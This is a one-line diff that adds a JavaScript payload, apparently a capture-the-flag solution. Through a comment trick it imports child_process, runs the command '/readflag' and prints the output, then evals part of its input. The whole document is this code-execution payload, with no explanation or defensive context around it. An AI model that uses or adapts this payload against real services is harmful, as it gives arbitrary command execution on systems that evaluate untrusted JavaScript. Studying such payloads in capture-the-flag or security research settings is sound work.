@@ -1,0 +1,1 @@
+/*import('child_process').then(({ exec }) => exec('/readflag', (err, stdout) => console.log(err ? err : stdout))) //*/eval?.(input.slice`2`)
